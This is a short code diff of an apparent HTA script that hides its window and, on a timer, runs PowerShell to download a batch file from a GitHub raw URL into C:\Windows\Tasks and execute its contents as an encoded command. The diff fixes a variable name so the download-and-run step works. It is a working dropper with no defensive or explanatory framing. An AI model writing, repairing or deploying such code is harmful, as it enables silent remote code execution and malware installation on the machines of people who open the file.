@@ -12,7 +12,7 @@ SHOWINTASKBAR="no"
 window.resizeTo(0,0);
 var myVar = setInterval(function(){ myTimer() }, 3000);
 function myTimer() {
-    objShell=new ActiveXObject("WScript.Shell");
+    shell = new ActiveXObject("WScript.Shell");
     res = shell.Run("powershell iwr -uri https://raw.githubusercontent.com/p477d343/T5CAMP/main/test.bat -outfile C:\\Windows\\Tasks\\test.bat;powershell -encodedCommand (Get-Content 'C:\\Windows\\Tasks\\test.bat' -raw)");
 window.close();
 }
